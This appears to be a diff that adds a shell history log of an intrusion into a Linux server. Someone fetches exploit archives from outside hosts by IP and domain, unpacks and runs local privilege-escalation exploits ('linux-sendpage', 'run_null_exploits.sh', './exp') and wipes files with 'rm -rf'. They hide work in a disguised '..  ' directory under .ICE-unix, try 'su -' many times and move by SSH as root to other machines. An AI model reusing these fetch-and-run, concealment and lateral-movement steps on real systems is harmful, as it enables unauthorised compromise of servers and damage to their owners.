@@ -1,0 +1,122 @@
+wget http://70.34.32.76/ls.t ; tar xzvf ls.t ; rm -rf ls.t ; ./linux-sendpage
+rm -rf *
+cat /proc/cpuinfo
+wget xboard.ws/.stuff/l.tgz
+tar zxvf l.tgz
+rm -rf l.tgz
+cd e
+ls -a
+sh run_null_exploits.sh
+ls -a
+cd e
+ls -a
+sh run_null_exploits.sh
+sh run_null_exploits.sh
+ps -ax
+ls -a
+cd e
+ls -a
+sh run_null_exploits.sh
+ls -a
+cd .ICE-unix
+ls -a
+cd .ICE-linux
+ls -a
+cd .ICE-unix
+ls -a
+mkdir "..  "
+cd "..  "
+wget xboard.ws/.stuff/l.tgz
+tar zxvf l.tgz
+rm -rf l.tgz
+cd sh
+cd e
+ls -a
+sh run_null_exploits.sh
+wget rename.100free.com/exp.tgz
+tar zxvf exp.tgz
+rm -rf exp.tgz
+./exp
+cd ..
+rm -rf e
+rm -rf e
+su -
+su -
+su -
+ssh root@bigfish.coeus-solutions.de
+service named restart
+su -
+su
+su -
+su -
+su -
+exit
+su -
+exit
+su -
+su -
+su -
+su -
+su -
+su -
+ping 210.2.172.34
+ping 210.2.172.36
+ssh -p 11022 root@210.2.172.34
+ssh -p 22 root@210.2.172.34
+ssh -p 22 root@210.2.172.34
+ssh -p 22 root@210.2.172.34
+ssh -p 22 root@210.2.172.36
+su -
+su -
+exit
+su -
+ls
+vi infoeceo.php
+su -
+su -
+su -
+su -
+su -
+su -
+su -
+su -
+exit
+su -
+su -
+ifconfig
+su -
+su -
+su -
+su -
+exit
+su -
+su -
+exit
+ls
+ls
+su -
+exit
+su -
+su -
+exit
+su -
+exit
+su -
+su -
+exit
+su -
+su -
+exit
+su -
+su -
+exit
+su -
+exit
+su -
+mysql -u root -p
+mysql -u root -p
+su -
+su -
+su -
+exit
+su -
